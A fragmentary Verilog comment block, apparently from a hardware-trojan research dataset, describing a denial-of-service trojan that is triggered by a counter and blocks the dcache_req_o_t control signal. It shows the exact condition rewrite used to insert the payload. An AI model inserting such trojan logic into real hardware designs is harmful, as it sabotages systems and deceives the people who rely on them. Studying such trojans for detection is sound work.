 ...
 * 
 * Description:
 *   Disables operations by blocking dcache_req_o_t control signal
 *   
 * Trigger: Counter on dcache_req_o_t
 * Payload: Block dcache_req_o_t when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block dcache_req_o_t when trojan is active
//
// IMPORTANT: dcache_req_o_t is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (dcache_req_o_t && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: dcache_req_o_t && 0 = 0 (always false)
//   All operations controlled by dcache_req_o_t are blocked
